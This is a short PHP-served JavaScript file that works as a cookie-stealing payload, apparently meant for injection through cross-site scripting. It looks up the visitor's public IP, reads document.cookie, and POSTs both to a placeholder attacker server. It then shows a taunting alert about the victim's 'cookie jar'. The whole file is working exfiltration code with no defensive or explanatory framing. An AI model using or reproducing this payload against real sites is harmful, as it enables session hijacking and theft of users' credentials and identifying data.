<?php

header('Content-Type: application/javascript');
header('Access-Control-Allow-Origin: *');

?>

fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
  console.log(data.ip);
  let document_cookie = document.cookie;

  const xhr = new XMLHttpRequest();
  xhr.open("POST","https://<attack_server_hostname>:<port>",true);
  var params = 'victim_ip='+data.ip+"&document_cookies="+document_cookie;
  xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
  xhr.onreadystatechange = function() {
    if(xhr.readyState == 4 && xhr.status == 200) {
      alert('should have locked your cookie jar');
    }
  }
  xhr.send(params);
  console.log(xhr.status);
});
